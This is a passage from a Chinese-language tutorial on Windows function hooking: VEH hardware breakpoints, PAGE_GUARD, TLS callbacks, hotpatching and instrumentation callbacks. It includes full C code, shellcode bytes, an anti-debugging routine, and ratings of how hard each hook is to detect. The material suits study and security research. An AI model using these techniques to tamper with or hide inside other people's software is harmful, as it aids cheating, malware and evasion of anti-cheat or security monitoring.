(MH_EnableHook(&amp;MessageBoxW) != MH_OK) return FALSE;\n    return TRUE;\n}\n\nvoid RemoveMinHookExample(void) {\n    MH_DisableHook(&amp;MessageBoxW);\n    MH_Uninitialize();\n}\n</code></pre><h3 id=\"section-27\">工业级方案对比</h3><table><thead><tr><th>库</th><th>维护方</th><th>特点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>Microsoft Detours</strong></td><td>微软</td><td>事务式 Hook、支持 32/64 位</td><td>官方工具、兼容性补丁</td></tr><tr><td><strong>MinHook</strong></td><td>社区</td><td>轻量、API 简洁</td><td>游戏/mod/安全工具</td></tr><tr><td><strong>PolyHook 2</strong></td><td>社区</td><td>支持多种 Hook 类型</td><td>需要多种 Hook 统一框架</td></tr><tr><td><strong>手写 + Zydis</strong></td><td>自研</td><td>完全可控</td><td>特殊指令/定制需求</td></tr></tbody></table><h3 id=\"section-28\">优点</h3><ul><li>通用性最强，可以 Hook 任何函数</li><li>不管调用方式（IAT/EAT/动态获取）都能拦截</li><li>Microsoft Detours 库提供了工业级实现</li></ul><h3 id=\"section-29\">局限</h3><ul><li>函数头部被直接修改，任何完整性校验都能发现</li><li>需要处理多线程竞态（Hook 安装瞬间其他线程正在执行目标函数）</li><li>x64 绝对跳转指令长达 14 字节，可能覆盖多条原始指令</li><li>指令重定位是最复杂的部分，生产环境建议使用 Zydis/distorm/MinHook</li></ul><hr><h2 id=\"section-30\">1.4 VEH Hook（向量化异常处理 Hook）</h2><h3 id=\"section-31\">技术定位</h3><p><strong>研究型 Hook</strong>，不修改目标函数字节。通过硬件断点（DR0-DR3）+ VEH 异常处理器劫持执行流。隐蔽性优于 Inline Hook，但有 4 个断点上限和性能开销。</p><h3 id=\"section-32\">原理</h3><p>利用 Windows <strong>向量化异常处理（VEH）</strong> 机制：在目标地址设置 CPU 硬件断点，执行到该地址时触发 <code>EXCEPTION_SINGLE_STEP</code>，VEH 处理器将 <code>RIP</code> 重定向到 Hook 函数。</p><pre data-note-kind=\"mermaid\"><code>sequenceDiagram\n    participant CPU\n    participant VEH as VEH 处理器\n    participant Hook as Hook 函数\n    participant Orig as 原始逻辑\n\n    CPU-&gt;&gt;CPU: 执行到 DR 断点地址\n    CPU-&gt;&gt;VEH: EXCEPTION_SINGLE_STEP\n    VEH-&gt;&gt;VEH: 修改 Context.Rip = Hook 地址\n    VEH-&gt;&gt;Hook: 继续执行 Hook 函数\n    Note over Hook,Orig: Hook 内可调用 originalFunction（Trampoline）\n</code></pre><h3 id=\"section-33\">完整实现（含多线程 DR 设置）</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;tlhelp32.h&gt;\n\ntypedef struct _VEH_HOOK_ENTRY {\n    PVOID targetAddress;      // 要 Hook 的地址\n    PVOID hookFunction;       // Hook 函数\n    PVOID originalFunction;   // 原始函数（通过 trampoline 调用）\nint drIndex;              // 使用的 DR 寄存器索引 (0-3)\n} VEH_HOOK_ENTRY;\n\n#define MAX_VEH_HOOKS 4\nVEH_HOOK_ENTRY g_vehHooks[MAX_VEH_HOOKS] = {0};\nint g_vehHookCount = 0;\nPVOID g_vehHandle = NULL;\n\n// VEH 异常处理器\nLONG CALLBACK VehExceptionHandler(PEXCEPTION_POINTERS pExInfo) {\nif (pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode != EXCEPTION_SINGLE_STEP)\nreturn EXCEPTION_CONTINUE_SEARCH;\n\n// 检查是哪个 Hook 触发的\nfor (int i = 0; i &lt; g_vehHookCount; i++) {\nif ((PVOID)pExInfo-&gt;ContextRecord-&gt;Rip == g_vehHooks[i].targetAddress) {\n// 劫持 RIP 到 Hook 函数\n            pExInfo-&gt;ContextRecord-&gt;Rip = (DWORD64)g_vehHooks[i].hookFunction;\n\n// 清除该 DR 的触发标志（DR6）\n            pExInfo-&gt;ContextRecord-&gt;Dr6 = 0;\n\nreturn EXCEPTION_CONTINUE_EXECUTION;\n        }\n    }\n\nreturn EXCEPTION_CONTINUE_SEARCH;\n}\n\n// 对单个线程设置 Debug Register\nBOOL SetThreadHwbp(HANDLE hThread, int drIndex, PVOID address) {\n    CONTEXT ctx;\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n\nif (!GetThreadContext(hThread, &amp;ctx)) return FALSE;\n\n// 设置 DRn 地址\nswitch (drIndex) {\ncase 0: ctx.Dr0 = (DWORD64)address; break;\ncase 1: ctx.Dr1 = (DWORD64)address; break;\ncase 2: ctx.Dr2 = (DWORD64)address; break;\ncase 3: ctx.Dr3 = (DWORD64)address; break;\n    }\n\n// 配置 DR7：启用对应断点，条件=执行，长度=1字节\n// DR7 格式：\n// Bit 0,2,4,6: Local Enable for DR0-3\n// Bit 16-17: Condition for DR0 (00=执行)\n// Bit 18-19: Length for DR0 (00=1字节)\n// 每个 DR 占 4 位 condition+length，从 bit 16 开始\n    ctx.Dr7 &amp;= ~(3ULL &lt;&lt; (drIndex * 2));      // 清除 enable 位\n    ctx.Dr7 |= (1ULL &lt;&lt; (drIndex * 2));        // 设置 local enable\n    ctx.Dr7 &amp;= ~(0xFULL &lt;&lt; (16 + drIndex * 4)); // 清除 condition+length\n// condition=00 (执行), length=00 (1字节) → 无需额外设置\n\nreturn SetThreadContext(hThread, &amp;ctx);\n}\n\n// 清除单个线程的 Debug Register\nBOOL ClearThreadHwbp(HANDLE hThread, int drIndex) {\n    CONTEXT ctx;\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n\nif (!GetThreadContext(hThread, &amp;ctx)) return FALSE;\n\nswitch (drIndex) {\ncase 0: ctx.Dr0 = 0; break;\ncase 1: ctx.Dr1 = 0; break;\ncase 2: ctx.Dr2 = 0; break;\ncase 3: ctx.Dr3 = 0; break;\n    }\n    ctx.Dr7 &amp;= ~(1ULL &lt;&lt; (drIndex * 2)); // 禁用\n\nreturn SetThreadContext(hThread, &amp;ctx);\n}\n\n// 对进程所有线程设置硬件断点\nBOOL SetAllThreadsHwbp(int drIndex, PVOID address) {\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\nif (hSnap == INVALID_HANDLE_VALUE) return FALSE;\n\n    THREADENTRY32 te = { .dwSize = sizeof(te) };\n    DWORD pid = GetCurrentProcessId();\n    DWORD tid = GetCurrentThreadId();\nBOOL success = TRUE;\n\nif (Thread32First(hSnap, &amp;te)) {\ndo {\nif (te.th32OwnerProcessID == pid) {\n                HANDLE hThread;\nif (te.th32ThreadID == tid) {\n// 当前线程需要特殊处理\n                    hThread = GetCurrentThread();\n                } else {\n                    hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, \nFALSE, te.th32ThreadID);\nif (!hThread) continue;\n                    SuspendThread(hThread);\n                }\n\nif (!SetThreadHwbp(hThread, drIndex, address))\n                    success = FALSE;\n\nif (te.th32ThreadID != tid) {\n                    ResumeThread(hThread);\n                    CloseHandle(hThread);\n                }\n            }\n        } while (Thread32Next(hSnap, &amp;te));\n    }\n    CloseHandle(hSnap);\nreturn success;\n}\n\n// 安装 VEH Hook\nBOOL InstallVehHook(PVOID targetAddr, PVOID hookFunc) {\nif (g_vehHookCount &gt;= MAX_VEH_HOOKS) return FALSE;\n\n// 注册 VEH 处理器（只需一次）\nif (!g_vehHandle) {\n        g_vehHandle = AddVectoredExceptionHandler(1, VehExceptionHandler);\nif (!g_vehHandle) return FALSE;\n    }\n\nint drIndex = g_vehHookCount;\n    g_vehHooks[drIndex].targetAddress = targetAddr;\n    g_vehHooks[drIndex].hookFunction = hookFunc;\n    g_vehHooks[drIndex].drIndex = drIndex;\n    g_vehHookCount++;\n\n// 对所有线程设置硬件断点\nreturn SetAllThreadsHwbp(drIndex, targetAddr);\n}\n\n// 卸载 VEH Hook\nBOOL RemoveVehHook(int drIndex) {\nif (drIndex &gt;= g_vehHookCount) return FALSE;\n\n// 清除所有线程的硬件断点\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    THREADENTRY32 te = { .dwSize = sizeof(te) };\n    DWORD pid = GetCurrentProcessId();\n\nif (Thread32First(hSnap, &amp;te)) {\ndo {\nif (te.th32OwnerProcessID == pid) {\n                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,\nFALSE, te.th32ThreadID);\nif (hThread) {\n                    SuspendThread(hThread);\n                    ClearThreadHwbp(hThread, drIndex);\n                    ResumeThread(hThread);\n                    CloseHandle(hThread);\n                }\n            }\n        } while (Thread32Next(hSnap, &amp;te));\n    }\n    CloseHandle(hSnap);\nreturn TRUE;\n}\n\n// 处理新线程：新线程创建后也需要设置 DR\n// 方案：Hook NtCreateThread/NtResumeThread 或使用 TLS Callback\n</code></pre><h3 id=\"section-34\">检测难度：★★★☆☆</h3><ul><li>不修改目标函数的任何字节，完整性校验通过</li><li>但 Debug Registers 可以被读取（<code>GetThreadContext</code>）</li><li>VEH 处理器可被枚举（<code>RtlAddVectoredExceptionHandler</code> 链表）</li></ul><h3 id=\"section-35\">新线程处理方案</h3><p>VEH Hook 最大痛点是<strong>新线程不继承 DR 设置</strong>。常见解法：</p><table><thead><tr><th>方案</th><th>实现方式</th><th>优缺点</th></tr></thead><tbody><tr><td>TLS Callback</td><td><code>DLL_THREAD_ATTACH</code> 时设置 DR</td><td>简单，但需 DLL 形态</td></tr><tr><td>Hook <code>NtResumeThread</code></td><td>线程恢复前注入 DR</td><td>覆盖面广，需 Inline Hook</td></tr><tr><td>周期性巡检</td><td>定时扫描新线程并补设 DR</td><td>有窗口期，实现简单</td></tr></tbody></table><h3 id=\"section-36\">优点</h3><ul><li>零字节修改，目标函数完全干净</li><li>硬件断点由 CPU 触发，不需要修改任何内存</li></ul><h3 id=\"section-37\">局限</h3><ul><li>硬件断点只有 4 个（DR0-DR3），最多同时 Hook 4 个地址</li><li>性能开销：每次触发需要进异常处理流程</li><li>反作弊可以清空 Debug Registers 或检测 VEH 链表</li><li>新创建的线程不会自动继承 DR 设置</li></ul><hr><h2 id=\"section-38\">1.5 PAGE_GUARD Hook（页面守卫 Hook）</h2><h3 id=\"section-39\">技术定位</h3><p><strong>几乎不用于生产</strong>，仅作概念验证。利用 <code>PAGE_GUARD</code> 页属性触发异常拦截，但粒度是整页（4KB），同页其他函数访问也会触发，性能极差。</p><h3 id=\"section-40\">原理</h3><p>利用 <code>PAGE_GUARD</code> 内存保护属性。对目标函数所在页设置 <code>PAGE_GUARD</code>，首次访问时触发 <code>STATUS_GUARD_PAGE_VIOLATION</code> 异常，在 VEH 处理器中进行拦截。触发后 Guard 位自动清除，需借助单步异常（TF 标志）重新设置。</p><h3 id=\"section-41\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n\ntypedef struct _GUARD_HOOK {\n    PVOID targetFunction;\n    PVOID hookFunction;\n    PVOID pageBase;          // 目标函数所在页的基地址\nBOOL active;\n} GUARD_HOOK;\n\nGUARD_HOOK g_guardHook = {0};\n\nLONG CALLBACK GuardPageHandler(PEXCEPTION_POINTERS pExInfo) {\n    DWORD exCode = pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode;\n\nif (exCode == STATUS_GUARD_PAGE_VIOLATION) {\n        PVOID faultAddr = pExInfo-&gt;ExceptionRecord-&gt;ExceptionAddress;\n\n// 检查是否是我们监控的函数\nif (faultAddr == g_guardHook.targetFunction) {\n// 劫持执行流\n            pExInfo-&gt;ContextRecord-&gt;Rip = (DWORD64)g_guardHook.hookFunction;\n        }\n\n// 设置单步标志 TF，让 CPU 执行完一条指令后触发 EXCEPTION_SINGLE_STEP\n// 目的：在单步执行后重新设置 PAGE_GUARD（因为触发一次后 PAGE_GUARD 自动移除）\n        pExInfo-&gt;ContextRecord-&gt;EFlags |= 0x100;\n\nreturn EXCEPTION_CONTINUE_EXECUTION;\n    }\n\nif (exCode == EXCEPTION_SINGLE_STEP &amp;&amp; g_guardHook.active) {\n// 单步执行完毕，重新设置 PAGE_GUARD\n        DWORD oldProtect;\n        VirtualProtect(g_guardHook.pageBase, PAGE_SIZE, \n                      PAGE_EXECUTE_READ | PAGE_GUARD, &amp;oldProtect);\nreturn EXCEPTION_CONTINUE_EXECUTION;\n    }\n\nreturn EXCEPTION_CONTINUE_SEARCH;\n}\n\nBOOL InstallGuardHook(PVOID target, PVOID hook) {\n    g_guardHook.targetFunction = target;\n    g_guardHook.hookFunction = hook;\n    g_guardHook.pageBase = (PVOID)((ULONG_PTR)target &amp; ~0xFFF); // 页对齐\n    g_guardHook.active = TRUE;\n\n    AddVectoredExceptionHandler(1, GuardPageHandler);\n\n    DWORD oldProtect;\nreturn VirtualProtect(g_guardHook.pageBase, PAGE_SIZE, \n                         PAGE_EXECUTE_READ | PAGE_GUARD, &amp;oldProtect);\n}\n</code></pre><h3 id=\"section-42\">检测难度：★★☆☆☆</h3><ul><li><p>不修改代码，但改变了页面属性</p></li><li><p>VirtualQuery 可以发现页面有 PAGE_GUARD 标志</p></li><li><p>同页上其他函数的调用也会触发异常，性能极差</p></li></ul><h3 id=\"section-43\">致命缺陷</h3><ul><li>整个页面（4KB）内的任何访问都会触发异常</li><li>如果目标函数所在页被频繁访问，性能几乎不可用</li><li>实际场景中几乎不使用，仅作为概念验证</li></ul><blockquote><p><strong>对比 VEH Hook</strong>：VEH 用硬件断点精确到字节；PAGE_GUARD 粒度是页。如需\"不修改函数字节\"的 Hook，应优先选 VEH。</p></blockquote><hr><h2 id=\"section-44\">1.6 TLS Callback Hook</h2><h3 id=\"section-45\">技术定位</h3><p><strong>早期执行时机利器</strong>。TLS Callback 在 <code>DllMain</code> 和 <code>main</code> 之前执行，适合抢在目标初始化前安装 Hook，或配合 VEH 给新线程设置硬件断点。</p><h3 id=\"section-46\">原理</h3><p>TLS（Thread Local Storage）Callback 是 PE 文件中注册的回调函数，在进程/线程创建和终止时被调用，且在 <code>DLL_PROCESS_ATTACH</code> <strong>之前</strong>执行。利用这个时机可以在程序的 <code>main</code> 函数之前就完成 Hook 安装。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    A[\"进程启动\"] --&gt; B[\"TLS Callback&lt;br/&gt;DLL_PROCESS_ATTACH\"]\n    B --&gt; C[\"DllMain&lt;br/&gt;DLL_PROCESS_ATTACH\"]\n    C --&gt; D[\"CRT 初始化\"]\n    D --&gt; E[\"main / WinMain\"]\n    B -.-&gt;|\"Hook 安装最佳时机\"| F[\"安装 IAT/Inline/VEH Hook\"]\n</code></pre><h3 id=\"section-47\">TLS Callback 触发时机</h3><table><thead><tr><th>Reason</th><th>触发时机</th><th>典型用途</th></tr></thead><tbody><tr><td><code>DLL_PROCESS_ATTACH</code></td><td>进程加载模块时，<strong>早于</strong> DllMain</td><td>极早 Hook、反调试</td></tr><tr><td><code>DLL_THREAD_ATTACH</code></td><td>新线程创建时</td><td>给新线程设 DR（配合 VEH）</td></tr><tr><td><code>DLL_THREAD_DETACH</code></td><td>线程退出时</td><td>清理 per-thread 资源</td></tr><tr><td><code>DLL_PROCESS_DETACH</code></td><td>进程卸载模块时</td><td>卸载 Hook</td></tr></tbody></table><h3 id=\"section-48\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n\n// 前置声明\nvoid NTAPI TlsCallbackFunction(PVOID DllHandle, DWORD Reason, PVOID Reserved);\n\n// TLS 目录声明（编译器会把这个放入 PE 的 TLS Directory）\n#ifdef _WIN64\n#pragma comment(linker, \"/INCLUDE:_tls_used\")\n#pragma const_seg(\".CRT$XLB\")\nEXTERN_C const PIMAGE_TLS_CALLBACK _tls_callback = TlsCallbackFunction;\n#pragma const_seg()\n#else\n#pragma comment(linker, \"/INCLUDE:__tls_used\")\n#pragma data_seg(\".CRT$XLB\")\nEXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallbackFunction;\n#pragma data_seg()\n#endif\n\n// 我们的 Hook 逻辑\ntypedef int (WINAPI* fnMessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT);\nfnMessageBoxW RealMessageBoxW = NULL;\n\nint WINAPI FakeMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {\n// 修改消息内容\nreturn RealMessageBoxW(hWnd, L\"HOOKED!\", lpCaption, uType);\n}\n\nvoid NTAPI TlsCallbackFunction(PVOID DllHandle, DWORD Reason, PVOID Reserved) {\nif (Reason == DLL_PROCESS_ATTACH) {\n// 此时程序的 main/WinMain 还没执行\n// 各种初始化也还没完成，但 kernel32/ntdll 已经加载\n\n// 安装 IAT Hook（或任何其他 Hook）\n        HMODULE hUser32 = LoadLibraryW(L\"user32.dll\");\nif (hUser32) {\n            RealMessageBoxW = (fnMessageBoxW)GetProcAddress(hUser32, \"MessageBoxW\");\n// 这里可以安装 Inline Hook 等...\nInstallHookEarly();\n        }\n    }\n}\n\n// TLS Callback 的高级用法：反调试\nvoid NTAPI AntiDebugTlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {\nif (Reason == DLL_PROCESS_ATTACH) {\n// 在最早期检测调试器\n        BOOL debuggerPresent = FALSE;\nCheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;debuggerPresent);\nif (IsDebuggerPresent() || debuggerPresent) {\n// 调试器存在，可以退出或做反制\nExitProcess(0);\n        }\n\n// 清除 PEB.BeingDebugged（如果被调试但 IsDebuggerPresent 被绕过）\n// NtCurrentPeb()-&gt;BeingDebugged = 0; \n    }\n\nif (Reason == DLL_THREAD_ATTACH) {\n// 每个新线程创建时都会触发\n// 可以在这里给新线程设置硬件断点（VEH Hook 的完美搭配）\nSetThreadHwbp(GetCurrentThread(), 0, g_hookTarget);\n    }\n}\n</code></pre><h3 id=\"section-49\">检测难度：★★☆☆☆</h3><ul><li>PE 文件的 TLS Directory 可以被静态分析</li><li>TLS Callback 数组的地址在 PE Header 中明确标注</li><li>但执行时机很早，某些检测机制可能还未初始化</li></ul><h3 id=\"section-50\">用途</h3><ul><li>在程序最早期安装 Hook（先于 CRT 初始化）</li><li>反调试（在调试器完全 attach 前检测）</li><li>配合 VEH Hook，在每个新线程上自动设置硬件断点</li></ul><hr><h2 id=\"section-51\">1.7 Hotpatch Hook（热补丁 Hook）</h2><h3 id=\"section-52\">技术定位</h3><p><strong>已基本弃用（x64）</strong>。利用微软为热补丁预留的 <code>mov edi,edi</code> + 前导 NOP 槽位实现短跳转 Hook。Windows x64 系统 DLL 不再使用此布局。</p><h3 id=\"section-53\">原理</h3><p>微软为了支持热补丁，许多 x86 系统函数头部保留 <code>mov edi, edi</code>（2 字节 NOP）和前面 5 字节的 NOP 填充。利用这些空间写入短跳转 + 近跳转，实现不覆盖任何有效指令的 Hook。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    subgraph 函数内存布局 x86\n        N1[\"-5: NOP×5\"] --&gt; N2[\"0: mov edi,edi\"]\n        N2 --&gt; N3[\"+2: 函数体...\"]\n    end\n    subgraph Hook 后\n        H1[\"-5: jmp Detour\"] --&gt; H2[\"0: jmp short -5\"]\n        H2 --&gt; H3[\"Detour 函数\"]\n    end\n</code></pre><h3 id=\"section-54\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n\ntypedef struct _HOTPATCH_HOOK {\n    PVOID pTarget;\n    PVOID pDetour;\n    BYTE savedPreamble[7];   // -5 到 +2 的原始字节\nBOOL installed;\n} HOTPATCH_HOOK;\n\n// 检查函数是否支持 Hotpatch\nBOOL IsHotpatchable(PVOID pFunction) {\n    BYTE* p = (BYTE*)pFunction;\n\n// 检查函数头：mov edi, edi (8B FF) 或 mov ecx, ecx (8B C9)\nif (p[0] != 0x8B || (p[1] != 0xFF &amp;&amp; p[1] != 0xC9))\nreturn FALSE;\n\n// 检查前面 5 字节是否为 NOP 或 INT 3\nfor (int i = 1; i &lt;= 5; i++) {\nif (p[-i] != 0x90 &amp;&amp; p[-i] != 0xCC)\nreturn FALSE;\n    }\nreturn TRUE;\n}\n\nBOOL InstallHotpatchHook(HOTPATCH_HOOK* hook) {\n    BYTE* pFunc = (BYTE*)hook-&gt;pTarget;\n\nif (!IsHotpatchable(hook-&gt;pTarget))\nreturn FALSE;\n\n// 备份原始字节\n    memcpy(hook-&gt;savedPreamble, pFunc - 5, 7);\n\n    DWORD oldProtect;\n    VirtualProtect(pFunc - 5, 7, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n\n// 在 -5 位置写入 5 字节近跳转到 Hook 函数\n// E9 [rel32] → jmp hook_function\n    pFunc[-5] = 0xE9;\n    *(int32_t*)(pFunc - 4) = (int32_t)((BYTE*)hook-&gt;pDetour - pFunc);\n\n// 在 +0 位置把 mov edi,edi 改为短跳转到 -5\n// EB F9 → jmp short -5 (相对于 +2 跳到 -5，偏移 = -7 = 0xF9)\n    *(WORD*)pFunc = 0xF9EB;\n\n    VirtualProtect(pFunc - 5, 7, oldProtect, &amp;oldProtect);\n    FlushInstructionCache(GetCurrentProcess(), pFunc - 5, 7);\n\n    hook-&gt;installed = TRUE;\nreturn TRUE;\n}\n\nBOOL RemoveHotpatchHook(HOTPATCH_HOOK* hook) {\nif (!hook-&gt;installed) return FALSE;\n\n    BYTE* pFunc = (BYTE*)hook-&gt;pTarget;\n    DWORD oldProtect;\n\n    VirtualProtect(pFunc - 5, 7, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    memcpy(pFunc - 5, hook-&gt;savedPreamble, 7);\n    VirtualProtect(pFunc - 5, 7, oldProtect, &amp;oldProtect);\n    FlushInstructionCache(GetCurrentProcess(), pFunc - 5, 7);\n\n    hook-&gt;installed = FALSE;\nreturn TRUE;\n}\n\n// 使用示例\nHOTPATCH_HOOK hpHook = {0};\nhpHook.pTarget = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"CreateFileW\");\nhpHook.pDetour = MyHookedCreateFileW;\nInstallHotpatchHook(&amp;hpHook);\n</code></pre><h3 id=\"section-55\">检测难度：★★☆☆☆</h3><p>虽然利用了合法的热补丁机制，但 <code>mov edi, edi</code> 被改写一样可以被检测到。</p><h3 id=\"section-56\">现状说明（重要）</h3><table><thead><tr><th>平台</th><th>是否可用</th><th>说明</th></tr></thead><tbody><tr><td>Windows x86</td><td>部分可用</td><td>旧版系统 DLL 可能有热补丁槽</td></tr><tr><td>Windows x64</td><td>❌ 基本不可用</td><td>系统 DLL 不再使用 <code>mov edi,edi</code> 前导</td></tr><tr><td>自编译代码</td><td>可用</td><td>MSVC <code>/hotpatch</code> 编译选项生成 2 字节 NOP 槽</td></tr></tbody></table><ul><li>Windows x64 系统函数不再使用 <code>mov edi, edi</code> 前导</li><li>主要适用于 32 位代码或旧版系统</li><li>现代 Windows 热补丁机制已变更（<code>/hotpatch</code> 生成 2 字节 NOP）</li></ul><blockquote><p><strong>替代方案</strong>：x64 上请使用 1.3 Inline Hook（MinHook/Detours）。</p></blockquote><hr><h2 id=\"section-57\">1.8 Instrumentation Callback Hook（用户态全局 syscall 回调）</h2><h3 id=\"section-58\">技术定位</h3><p><strong>Win10+ x64 特有机制</strong>，红队/安全研究中用于监控 syscall 返回路径。一次设置可拦截所有系统调用从内核返回用户态的时刻，但无法拦截普通函数调用。</p><h3 id=\"section-59\">原理</h3><p>Windows 提供 <code>NtSetInformationProcess</code> + <code>ProcessInstrumentationCallback</code>（信息类 = 40）。设置后，每次 syscall 从内核返回用户态时，内核会跳转到指定回调函数。</p><pre data-note-kind=\"mermaid\"><code>sequenceDiagram\n    participant App as 用户态\n    participant Ntdll as ntdll stub\n    participant Kernel as 内核\n    participant CB as Instrumentation Callback\n\n    App-&gt;&gt;Ntdll: call NtXxx\n    Ntdll-&gt;&gt;Kernel: syscall\n    Kernel--&gt;&gt;Ntdll: 返回\n    Note over Ntdll,CB: 正常情况下直接返回到调用方\n    Ntdll--&gt;&gt;CB: 内核强制跳转到 Callback\n    CB-&gt;&gt;CB: 检查返回地址 / 修改 RAX\n    CB-&gt;&gt;App: jmp r10（原始返回地址）\n</code></pre><p><strong>进入 Callback 时的寄存器状态（x64）</strong>：</p><ul><li><code>R10</code> = 原始返回地址（syscall 返回后本来要去的地方）</li><li><code>RAX</code> = syscall 返回值</li><li>其余寄存器保持 syscall 返回时状态</li></ul><h3 id=\"section-60\">完整实现（可编译 x64 ASM）</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt;\n\n// 未导出的结构体\ntypedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {\n    ULONG Version;    // 0 for x64, 1 for x86\n    ULONG Reserved;\n    PVOID Callback;\n} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;\n\n// NtSetInformationProcess 原型\ntypedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(\n    HANDLE ProcessHandle,\n    ULONG ProcessInformationClass,\n    PVOID ProcessInformation,\n    ULONG ProcessInformationLength\n);\n\n#define ProcessInstrumentationCallback 40\n\n// 全局变量\nvolatile LONG g_insideCallback = 0;  // 防止递归\nPVOID g_callbackTarget = NULL;       // 我们要监控的函数\n\n// Instrumentation Callback 入口点（必须是裸函数，手动管理栈）\n// 进入时的寄存器状态：\n//   R10 = 原始返回地址（syscall 返回后本来要去的地方）\n//   RAX = syscall 返回值\n//   所有其他寄存器保持 syscall 返回时的状态\nextern void InstrumentationCallbackEntry(void);\n\n// 汇编实现（MASM 语法，保存为 .asm 文件）\n// InstrumentationCallbackEntry PROC\n//     ; 保存所有寄存器（必须，因为我们要调用 C 函数）\n//     push rax\n//     push rcx\n//     push rdx\n//     push rbx\n//     push rbp\n//     push rsi\n//     push rdi\n//     push r8\n//     push r9\n//     push r10\n//     push r11\n//     push r12\n//     push r13\n//     push r14\n//     push r15\n//     pushfq\n//     sub rsp, 28h          ; Shadow space for calls\n//     \n//     ; 防止递归（Callback 内部的 syscall 也会触发回调）\n//     lock inc dword ptr [g_insideCallback]\n//     cmp dword ptr [g_insideCallback], 1\n//     jne skip_processing\n//     \n//     ; 调用 C 处理函数\n//     ; RCX = 原始返回地址 (R10)\n//     ; RDX = syscall 返回值 (RAX)\n//     mov rcx, [rsp + 28h + 8*15 + 8 + 8*5]  ; R10 from saved regs\n//     mov rdx, [rsp + 28h + 8*15 + 8]          ; RAX from saved regs\n//     call InstrumentationCallbackHandler\n//     \n// skip_processing:\n//     lock dec dword ptr [g_insideCallback]\n//     \n//     add rsp, 28h\n//     popfq\n//     pop r15\n//     pop r14\n//     pop r13\n//     pop r12\n//     pop r11\n//     pop r10\n//     pop r9\n//     pop r8\n//     pop rdi\n//     pop rsi\n//     pop rbp\n//     pop rbx\n//     pop rdx\n//     pop rcx\n//     pop rax\n//     \n//     ; 跳转到原始返回地址\n//     jmp r10\n// InstrumentationCallbackEntry ENDP\n\n// 简化版 C 实现（使用内联汇编替代，仅适用于 MSVC x86 或需要单独 .asm）\n// 对于纯 C 项目，可以使用 shellcode 方式：\nBYTE g_callbackShellcode[] = {\n0x50,                               // push rax\n0x51,                               // push rcx\n0x52,                               // push rdx\n0x53,                               // push rbx\n0x55,                               // push rbp\n0x56,                               // push rsi\n0x57,                               // push rdi\n0x41, 0x50,                         // push r8\n0x41, 0x51,                         // push r9\n0x41, 0x52,                         // push r10\n0x41, 0x53,                         // push r11\n0x41, 0x54,                         // push r12\n0x41, 0x55,                         // push r13\n0x41, 0x56,                         // push r14\n0x41, 0x57,                         // push r15\n0x9C,                               // pushfq\n0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28\n0x49, 0x89, 0xD1,                   // mov r9, rdx (保存)\n0x4C, 0x89, 0xD1,                   // mov rcx, r10 (返回地址)\n0x48, 0x89, 0xC2,                   // mov rdx, rax (syscall 返回值)\n0xFF, 0x15, 0x00, 0x00, 0x00, 0x00, // call [rip+0] → 这里需要 patch 为实际地址\n// ... 恢复寄存器 ...\n0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28\n0x9D,                               // popfq\n0x41, 0x5F,                         // pop r15\n0x41, 0x5E,                         // pop r14\n0x41, 0x5D,                         // pop r13\n0x41, 0x5C,                         // pop r12\n0x41, 0x5B,                         // pop r11\n0x41, 0x5A,                         // pop r10\n0x41, 0x59,                         // pop r9\n0x41, 0x58,                         // pop r8\n0x5F,                               // pop rdi\n0x5E,                               // pop rsi\n0x5D,                               // pop rbp\n0x5B,                               // pop rbx\n0x5A,                               // pop rdx\n0x59,                               // pop rcx\n0x58,                               // pop rax\n0x41, 0xFF, 0xE2                    // jmp r10\n};\n\n// C 处理函数\nvoid InstrumentationCallbackHandler(PVOID returnAddress, ULONG64 syscallReturnValue) {\n// returnAddress 是内核返回后要去的用户态地址\n// 通过 returnAddress 可以判断是哪个 syscall（返回到 ntdll 的哪个 stub）\n\n// 例：监控 NtReadVirtualMemory 的返回\n// if (returnAddress == NtReadVirtualMemory_RetAddr) { ... }\n\n// 也可以修改 RAX 来篡改 syscall 返回值\n}\n\n// 安装 Instrumentation Callback\nBOOL InstallInstrumentationCallback() {\n    fnNtSetInformationProcess NtSetInformationProcess = \n        (fnNtSetInformationProcess)GetProcAddress(\n            GetModuleHandleA(\"ntdll.dll\"), \"NtSetInformationProcess\");\n\nif (!NtSetInformationProcess) return FALSE;\n\n// 分配可执行内存给 shellcode\n    PVOID pCallback = VirtualAlloc(NULL, sizeof(g_callbackShellcode), \n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    memcpy(pCallback, g_callbackShellcode, sizeof(g_callbackShellcode));\n\n// Patch shellcode 中的函数指针\n// （实际使用时需要正确计算偏移）\n\n    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION info = {\n        .Version = 0,  // x64\n        .Reserved = 0,\n        